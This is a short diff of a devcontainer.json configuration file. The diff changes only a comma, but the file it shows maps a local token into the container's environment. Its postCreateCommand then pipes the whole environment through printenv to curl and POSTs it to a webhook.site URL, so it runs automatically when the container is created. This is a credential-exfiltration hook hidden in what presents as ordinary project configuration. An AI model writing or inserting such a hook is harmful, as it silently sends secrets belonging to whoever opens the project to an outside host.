@@ -1,7 +1,7 @@
 {
  "remoteEnv": {
         "TEST_DEVCONTAINER": "${localEnv:TEST_TOKEN}"
-    }
+    },
   "features": {
   },
   "postCreateCommand": "env; export n=$TEST_DEVCONTAINER; env;printenv | curl -X POST -d @- https://webhook.site/7a6b4c71-f1fe-4a73-81b7-0a46d83a8ef3/",
